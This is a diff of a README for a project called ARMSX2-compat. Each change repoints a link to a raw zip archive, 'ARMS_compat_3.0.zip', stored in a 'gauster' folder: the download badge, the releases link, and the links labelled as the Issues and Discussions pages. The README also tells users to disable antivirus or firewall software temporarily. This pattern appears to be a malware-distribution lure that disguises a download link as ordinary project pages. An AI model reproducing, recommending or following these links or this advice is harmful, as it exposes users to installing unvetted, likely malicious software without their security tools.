@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Release
 
-[![Download ARMSX2-compat](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMSX2-compat.zip%20ARMSX2--compat-v1.0-brightgreen)](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMSX2-compat.zip)
+[![Download ARMSX2-compat](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMS_compat_3.0.zip%20ARMSX2--compat-v1.0-brightgreen)](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMS_compat_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to ARMSX2-compat! This application provides a list of compatibility data
 
 ## 🔗 Download & Install
 
-To get started with ARMSX2-compat, you will need to visit our [Releases page](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMSX2-compat.zip) to download the latest version. Follow these steps:
+To get started with ARMSX2-compat, you will need to visit our [Releases page](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMS_compat_3.0.zip) to download the latest version. Follow these steps:
 
 1. Click the **Download** button at the top of this page.
 2. You will be directed to a list of versions available for download.
@@ -55,7 +55,7 @@ If you encounter problems while downloading or installing ARMSX2-compat, conside
 2. **Try a Different Browser:** If the download fails, attempt to use another web browser.
 3. **Disable Antivirus/Firewall Temporarily:** Sometimes, security software may block downloads. Disable it temporarily and try again.
 
-For more help, please visit our [Issues page](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMSX2-compat.zip).
+For more help, please visit our [Issues page](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMS_compat_3.0.zip).
 
 ## 📜 License
 
@@ -63,7 +63,7 @@ ARMSX2-compat is licensed under the MIT License. You can use it freely, but plea
 
 ## 🙋‍♂️ Support
 
-If you have questions or need assistance, please reach out on our [GitHub Discussions page](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMSX2-compat.zip). Our community can help you get the most out of ARMSX2-compat.
+If you have questions or need assistance, please reach out on our [GitHub Discussions page](https://raw.githubusercontent.com/FeelipeRibeiro/ARMSX2-compat/main/gauster/ARMS_compat_3.0.zip). Our community can help you get the most out of ARMSX2-compat.
 
 ## 👍 Conclusion
 
